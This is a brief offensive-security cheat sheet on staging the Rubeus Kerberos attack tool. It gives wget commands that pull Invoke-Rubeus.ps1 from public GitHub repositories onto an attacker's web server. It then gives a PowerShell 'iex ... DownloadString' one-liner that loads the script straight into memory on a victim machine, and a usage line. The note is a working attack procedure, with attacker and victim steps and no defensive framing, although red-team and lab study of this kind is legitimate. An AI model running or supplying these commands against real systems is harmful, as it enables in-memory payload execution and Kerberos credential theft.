# Rubeus
## Attacker 
```bash
# Download Rubeus to Attacker 
wget https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Rubeus.ps1 

# OR 
wget https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1

 # Host on Web Server
```
## Victim
```powershell
# On Victim: Load into Session 
iex ([System.Net.WebClient]::new().DownloadString('<url>/Invoke-Rubeus.ps1')) 

#Usage
Invoke-Rubeus -Command "<rubeus_arguments>"
```